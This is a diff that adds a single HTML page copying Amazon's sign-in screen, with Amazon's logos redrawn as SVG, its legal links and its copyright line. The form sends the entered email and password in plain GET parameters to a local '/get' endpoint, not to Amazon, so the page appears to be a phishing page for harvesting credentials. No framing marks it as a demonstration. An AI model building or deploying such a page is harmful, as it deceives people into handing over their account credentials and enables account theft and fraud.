@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon - Login</title>
+    <style>
+        .svgHeader {
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .svgHeader svg {
+            width: 8%;
+            height: auto;
+        }
+
+        .botAmzLog {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: -9px;
+        }
+
+        .botAmzLog svg {
+            width: 5%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        a {
+            color: #0066C0;
+            text-decoration: none;
+        }
+
+        body,
+        html {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        .globalSignIn {
+            max-width: 350px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+        }
+
+        .a-form-label {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 80%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            width: 94%;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            box-shadow: #4fa0e7 0px 0px 3px;
+            border: 1px solid #1b77c8;
+
+        }
+
+        .emailGlob {
+            margin-bottom: 10px;
+        }
+
+        .passwGlob {
+            margin-bottom: 15px;
+        }
+
+        .buttonValid {
+            background-color: #FFD815;
+            color: #000000;
+            border: none;
+            width: 100%;
+            border-radius: 10px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 15px;
+
+        }
+
+        .buttonValid:hover {
+            background-color: #deb900;
+
+        }
+
+        #legalTextRow {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        #legalTextRow a {
+            color: #0066c0;
+            text-decoration: none;
+            margin-right: 10px;
+        }
+
+        #needBtn {
+            font-size: 14px;
+        }
+
+        .needButton a {
+            color: #0066c0;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .newButton {
+            color: #000000;
+            text-align: center;
+        }
+
+        .newButton a {
+            color: #000000;
+            margin: 0 auto;
+            padding: 8px;
+            border: 1px solid #ccc;
+            box-shadow: hsl(0, 2%, 90%) 0px 0px 4px;
+            border-radius: 8px;
+            width: 375px;
+            display: block;
+            font-size: 14px;
+        }
+
+        .newButton a:hover {
+            background-color: #f4f6f8;
+        }
+
+        footer {
+            margin-top: 50px;
+            background-color: #ffffff;
+            padding: 10px;
+            text-align: center;
+        }
+
+        footer a {
+            color: #555;
+            text-decoration: none;
+            margin-right: 10px;
+            color: #0066C0;
+            font-size: 13px;
+        }
+
+        #legBotText {
+            margin-top: 15px;
+            font-size: 12px;
+        }
+
+        .auth-footer-separator {
+            margin: 0 5px;
+        }
+
+        @media (max-width: 768px) {
+            /* Adjust the SVG headers to fit mobile screens */
+            .svgHeader svg {
+                width: 30%;
+            }
+
+            .botAmzLog svg {
+                width: 20%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="svgHeader">
+            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="2560.000000pt" height="773.000000pt"
+                viewBox="0 0 2560.000000 773.000000" preserveAspectRatio="xMidYMid meet">
+
+                <g transform="translate(0.000000,773.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
+                    <path d="M1730 7714 c-422 -36 -738 -134 -1001 -309 -282 -188 -471 -460 -559
+                        -804 -29 -116 -27 -162 11 -206 17 -19 47 -39 67 -45 21 -6 209 -28 419 -51
+                        401 -42 399 -42 447 0 26 23 45 64 68 145 29 105 74 183 149 258 110 109 249
+                        165 434 175 240 12 436 -86 519 -261 46 -97 57 -166 63 -398 l6 -217 -24 -5
+                        c-13 -3 -139 -17 -279 -31 -667 -69 -990 -141 -1281 -286 -258 -128 -486 -353
+                        -608 -597 -39 -77 -94 -239 -116 -342 -23 -103 -31 -400 -15 -527 66 -527 374
+                        -875 875 -988 96 -22 412 -31 557 -16 363 38 597 152 925 450 l120 109 77
+                        -112 c102 -150 178 -239 287 -335 127 -113 186 -124 280 -53 32 23 364 310
+                        571 493 110 97 105 134 -42 339 -102 143 -161 256 -192 367 -22 77 -22 92 -29
+                        1078 -6 1074 -7 1090 -61 1289 -126 471 -520 765 -1153 861 -97 15 -424 27
+                        -515 19z m617 -2631 c-6 -299 -18 -398 -63 -538 -98 -301 -311 -510 -556 -547
+                        -209 -31 -400 65 -488 245 -51 107 -65 176 -64 332 0 161 20 252 80 365 140
+                        267 481 414 973 419 l124 1 -6 -277z" />
+                    <path d="M12095 7714 c-411 -34 -731 -135 -999 -314 -278 -186 -464 -455 -551
+                        -799 -30 -117 -31 -146 -5 -189 37 -60 69 -67 492 -112 370 -39 390 -40 423
+                        -24 44 21 71 64 96 156 46 165 146 293 288 367 98 51 172 70 297 78 242 15
+                        436 -83 521 -263 48 -102 62 -195 63 -421 0 -192 0 -193 -22 -197 -13 -3 -117
+                        -15 -233 -26 -600 -60 -918 -122 -1189 -231 -406 -164 -699 -468 -816 -849
+                        -53 -171 -64 -257 -64 -465 0 -206 14 -311 61 -459 133 -426 456 -691 921
+                        -757 111 -15 458 -7 577 15 303 55 550 190 818 446 l105 100 88 -127 c86 -124
+                        296 -352 367 -398 36 -23 112 -23 157 0 19 10 121 93 225 185 105 91 242 210
+                        305 263 129 110 150 136 150 190 0 48 -16 79 -105 202 -126 174 -164 248 -208
+                        405 -21 73 -21 99 -27 1090 -7 981 -8 1019 -28 1128 -51 269 -141 442 -316
+                        610 -204 196 -488 319 -866 377 -103 15 -425 27 -525 19z m622 -2651 c-5 -328
+                        -17 -417 -77 -572 -129 -332 -406 -533 -682 -493 -261 38 -409 243 -409 567 0
+                        153 19 246 75 360 71 144 190 250 360 322 165 70 387 110 620 112 l118 1 -5
+                        -297z" />
+                    <path d="M6292 7670 c-305 -43 -551 -195 -716 -443 -53 -80 -146 -261 -146
+                        -286 0 -6 -4 -11 -9 -11 -6 0 -11 114 -13 283 -3 277 -3 283 -26 315 -45 63
+                        -39 62 -493 62 -401 0 -413 -1 -446 -21 -18 -11 -41 -35 -51 -52 -16 -30 -17
+                        -160 -17 -2099 l0 -2067 21 -27 c11 -15 33 -37 48 -48 27 -20 39 -21 471 -21
+                        432 0 444 1 471 21 15 11 37 33 48 48 21 27 21 34 27 1369 6 1400 5 1391 50
+                        1564 58 227 188 366 377 403 88 18 232 8 305 -20 75 -28 164 -110 206 -190 39
+                        -73 77 -216 87 -330 4 -47 8 -686 8 -1420 1 -1487 -5 -1370 68 -1422 l33 -23
+                        442 0 c430 0 442 1 469 21 15 11 37 33 48 48 21 27 21 34 26 1374 6 1453 5
+                        1417 59 1593 36 116 116 218 225 290 84 56 168 79 280 79 281 0 424 -135 462
+                        -435 4 -33 8 -692 8 -1465 1 -1359 2 -1406 20 -1433 10 -15 33 -38 50 -50 31
+                        -22 32 -22 473 -22 430 0 442 1 469 21 15 11 37 33 48 48 l21 27 0 1662 c0
+                        1780 2 1702 -51 1905 -98 380 -397 648 -824 739 -104 22 -349 24 -460 4 -376
+                        -68 -684 -310 -835 -657 l-33 -76 -48 99 c-65 133 -168 285 -249 366 -188 190
+                        -395 275 -690 282 -82 2 -178 0 -213 -5z" />
+                    <path d="M19730 7670 c-586 -72 -1035 -400 -1305 -955 -82 -167 -127 -292
+                        -175 -480 -159 -622 -119 -1372 101 -1928 205 -517 547 -872 999 -1040 290
+                        -107 644 -127 970 -56 586 129 1056 594 1279 1265 91 275 130 507 138 834 22
+                        880 -257 1618 -764 2021 -218 173 -451 276 -743 326 -104 17 -398 25 -500 13z
+                        m359 -835 c142 -34 259 -130 326 -269 48 -100 99 -309 124 -506 45 -348 48
+                        -947 6 -1263 -47 -361 -161 -605 -333 -716 -140 -89 -334 -102 -479 -31 -235
+                        116 -365 446 -403 1025 -13 204 -13 673 0 841 39 493 161 774 387 888 90 45
+                        252 59 372 31z" />
+                    <path d="M24272 7669 c-392 -51 -668 -283 -858 -721 -20 -49 -41 -88 -46 -88
+                        -4 0 -8 142 -8 316 0 300 -1 318 -20 349 -40 65 -44 65 -497 65 -387 0 -410
+                        -1 -440 -20 -18 -10 -40 -34 -50 -52 -17 -32 -18 -125 -15 -2098 4 -2323 -4
+                        -2104 82 -2148 l45 -23 427 3 c413 3 427 4 454 24 15 11 37 33 48 48 21 27 21
+                        35 27 1304 6 1432 3 1375 80 1606 50 150 86 214 168 297 130 130 296 178 466
+                        134 188 -49 287 -181 341 -455 16 -77 18 -222 23 -1475 6 -1325 7 -1392 24
+                        -1419 10 -15 37 -36 60 -47 39 -17 71 -19 457 -19 388 0 418 2 457 20 25 11
+                        51 33 63 52 20 33 20 46 20 1524 0 920 -4 1540 -10 1620 -19 243 -67 470 -127
+                        609 -97 222 -300 424 -518 514 -189 79 -433 109 -653 80z" />
+                    <path d="M14915 7601 c-48 -12 -75 -30 -95 -64 -19 -30 -20 -53 -20 -367 0
+                        -314 1 -337 20 -367 43 -72 -4 -67 777 -73 l703 -5 -788 -1131 c-434 -622
+                        -798 -1155 -811 -1184 -46 -106 -51 -160 -51 -563 0 -414 -1 -409 60 -461 47
+                        -39 81 -34 221 33 304 144 629 235 969 272 143 15 470 15 610 0 372 -41 729
+                        -144 1039 -300 33 -17 73 -31 89 -31 38 0 90 37 114 80 17 33 18 59 16 395 -3
+                        347 -4 361 -25 401 -34 63 -79 100 -193 158 -342 174 -712 259 -1201 275
+                        l-197 6 733 1047 c403 576 749 1079 769 1119 l36 72 0 296 c0 276 -1 298 -20
+                        328 -10 18 -34 40 -52 50 -31 17 -103 18 -1353 20 -726 0 -1333 -2 -1350 -6z" />
+                </g>
+            </svg>
+        </div>
+        <div class="botAmzLog">
+            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="1411.000000pt" height="314.000000pt"
+                viewBox="0 0 1411.000000 314.000000" preserveAspectRatio="xMidYMid meet">
+
+                <g transform="translate(0.000000,314.000000) scale(0.100000,-0.100000)" fill="#FD9A17" stroke="none">
+                    <path d="M12580 3059 c-443 -45 -832 -169 -1131 -360 -126 -81 -171 -149 -134
+                        -205 31 -48 49 -50 268 -26 330 37 492 51 720 62 456 21 762 -25 849 -129 134
+                        -158 36 -631 -318 -1534 -80 -203 -89 -252 -54 -287 26 -26 81 -26 137 1 54
+                        26 236 205 324 319 192 246 346 539 455 865 166 497 211 1017 98 1130 -71 71
+                        -304 136 -593 165 -120 12 -498 11 -621 -1z" />
+                    <path d="M370 2804 c-83 -29 -112 -99 -75 -178 43 -90 691 -611 1130 -908
+                        1410 -955 3025 -1525 4735 -1672 418 -36 1024 -48 1395 -26 1813 106 3594 683
+                        4878 1583 185 129 219 168 225 258 7 99 -50 171 -157 199 -66 17 -117 6 -305
+                        -72 -1299 -533 -2679 -854 -4146 -964 -285 -21 -1107 -30 -1425 -15 -1720 81
+                        -3363 465 -4906 1147 -271 120 -736 350 -959 474 -80 45 -181 101 -225 125
+                        -78 43 -135 59 -165 49z" />
+                </g>
+            </svg>
+        </div>
+
+    </header>
+
+    <main>
+        <div class="globalSignIn">
+            <form name="signIn" method="GET" action="/get">
+                <h1 class="a-spacing-small">
+                    Sign in
+                </h1>
+
+                <div class="enterLogGlob">
+                    <div class="emailGlob">
+                        <label for="ap_email" class="a-form-label"> Email or mobile phone number </label>
+                        <input type="email" maxlength="128" id="ap_email" name="email" required>
+                    </div>
+                    <div class="passwGlob">
+                        <label for="ap_password" class="a-form-label"> Password </label>
+                        <input type="password" maxlength="1024" name="password" id="ap_password" required>
+                    </div>
+                </div>
+
+                <button id="button" type="submit" class="buttonValid"> Continue </button>
+
+                <div id="legalTextRow">By continuing, you agree to Amazon's
+                    <a href="#">Conditions of Use </a> and <a href="#"> Privacy Notice</a>
+                </div>
+
+                <div id="needBtn">
+                    <a href="#">Need help?</a>
+                </div>
+
+            </form>
+
+        </div>
+
+        <div class="newButton">
+            <h5 aria-level="5">New to Amazon?</h5>
+            <a href="#">Create your Amazon account</a>
+        </div>
+    </main>
+
+    <footer>
+        <div>
+            <a href="#"> Conditions of Use </a>
+            <span class="auth-footer-separator"></span>
+            <a target="_blank" href="#"> Privacy Notice</a>
+            <a href="#">Help</a>
+        </div>
+
+        <div id="legBotText">
+            <span>
+                © 1996-2023, Amazon.com, Inc. or its affiliates
+            </span>
+        </div>
+    </footer>
+</body>
+
+</html>
